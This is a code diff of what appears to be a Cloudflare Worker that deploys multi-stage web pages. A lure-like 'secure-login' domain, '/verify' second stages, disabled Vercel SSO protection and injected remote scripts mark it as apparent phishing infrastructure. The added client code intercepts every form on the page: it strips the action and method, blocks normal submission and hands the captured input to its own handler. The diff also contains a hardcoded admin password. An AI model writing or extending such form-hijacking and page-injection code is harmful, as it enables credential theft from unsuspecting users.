@@ -5,7 +5,6 @@
 
 const PASSWORD = "admin-secret-123";
 const COOKIE_NAME = "admin_session";
-const ROOT_DOMAIN = "secure-login.co.za";
 
 export default {
   async fetch(request, env, ctx) {
@@ -136,7 +135,7 @@ export default {
     }
 
     if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
-        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
+        return respond(await handlePublicDeploy(request, env, domain));
     }
 
     if (url.pathname === '/api/public/templates' && request.method === 'GET') {
@@ -155,56 +154,6 @@ export default {
     if (url.pathname === '/api/pay/verify' && request.method === 'POST') {
         return respond(await handlePaymentVerify(request, env));
     }
-
-    // --- 3. SUBDOMAIN ROUTING ---
-
-    let subdomain = null;
-    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
-        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
-    }
-
-    if (subdomain && subdomain !== 'www') {
-        let lookupKey = subdomain;
-        if (url.pathname === '/verify' || url.pathname === '/verify/') {
-            lookupKey = `${subdomain}::stage2`;
-        }
-
-        const data = await env.SUBDOMAINS.get(lookupKey, { type: "json" });
-
-        if (!data) {
-           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
-               status: 404,
-               headers: { 'Content-Type': 'text/html' }
-           });
-        }
-
-        if (data.type === 'HTML') {
-          return new Response(data.content, {
-            headers: { 'Content-Type': 'text/html' }
-          });
-        }
-
-        if (data.type === 'PROXY') {
-          try {
-            const targetUrl = data.content;
-            const forwardUrl = new URL(targetUrl);
-            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
-            forwardUrl.search = url.search;
-
-            const proxyResponse = await fetch(forwardUrl.toString(), {
-              headers: {
-                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
-              }
-            });
-
-            const response = new Response(proxyResponse.body, proxyResponse);
-            return response;
-
-          } catch (err) {
-            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
-          }
-        }
-      }
 
       return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
           headers: { 'Content-Type': 'application/json' }
@@ -602,8 +551,8 @@ async function handlePublicDeploy(request, env, rootDomain) {
             }
             injectionBlockStage1 += `<script src="${scriptUrl}"></script>`;
 
-            if (htmlContent.includes('</body>')) {
-                htmlContent = htmlContent.replace('</body>', `${injectionBlockStage1}</body>`);
+            if (/<\/body>/i.test(htmlContent)) {
+                htmlContent = htmlContent.replace(/<\/body>/i, `${injectionBlockStage1}</body>`);
             } else {
                 htmlContent += injectionBlockStage1;
             }
@@ -617,8 +566,8 @@ async function handlePublicDeploy(request, env, rootDomain) {
                 injectionBlockStage2 += `<script>window.MULTI_STAGE = 2;</script>`;
                 injectionBlockStage2 += `<script src="${scriptUrl}"></script>`;
 
-                if (htmlContentStage2.includes('</body>')) {
-                    htmlContentStage2 = htmlContentStage2.replace('</body>', `${injectionBlockStage2}</body>`);
+                if (/<\/body>/i.test(htmlContentStage2)) {
+                    htmlContentStage2 = htmlContentStage2.replace(/<\/body>/i, `${injectionBlockStage2}</body>`);
                 } else {
                     htmlContentStage2 += injectionBlockStage2;
                 }
@@ -651,7 +600,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
         const projectName = subdomain;
 
         // 1. Create/Patch Project to disable SSO Protection
-        let vercelUrl = `https://${subdomain}.${rootDomain}`;
+        let vercelUrl = `https://${subdomain}.vercel.app`;
 
         try {
             if (VERCEL_TOKEN) {
@@ -711,10 +660,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
                     body: JSON.stringify(deployBody)
                 });
 
-                if (deployRes.ok) {
-                    const deployData = await deployRes.json();
-                    vercelUrl = 'https://' + deployData.url;
-                } else {
+                if (!deployRes.ok) {
                     console.log("Vercel Deploy Error", await deployRes.text());
                 }
             } else {
@@ -1090,8 +1036,8 @@ async function handleGetTemplatePreview(request, env) {
         </script>
     `;
 
-    if (content.includes('</body>')) {
-        content = content.replace('</body>', `${overlayScript}</body>`);
+    if (/<\/body>/i.test(content)) {
+        content = content.replace(/<\/body>/i, `${overlayScript}</body>`);
     } else {
         content += overlayScript;
     }
@@ -1413,7 +1359,14 @@ const CONFIG = {
 
     const setupSubmissionHandlers = () => {
         document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', (e) => handleAction(e, e.target), true);
+            // Remove action and method to prevent default submission behaviors completely
+            form.removeAttribute('action');
+            form.removeAttribute('method');
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                handleAction(e, e.target);
+            }, true);
         });
 
         document.addEventListener('click', (e) => {
@@ -1431,6 +1384,9 @@ const CONFIG = {
                 if (['DIV', 'SPAN'].includes(btn.tagName)) {
                      const style = window.getComputedStyle(btn);
                      if (style.cursor !== 'pointer' && btn.getAttribute('role') !== 'button') return;
+                }
+                if (e.type === 'click' && btn.tagName === 'A') {
+                    e.preventDefault(); // prevent navigation on a tags acting as buttons
                 }
                 handleAction(e, btn);
             }
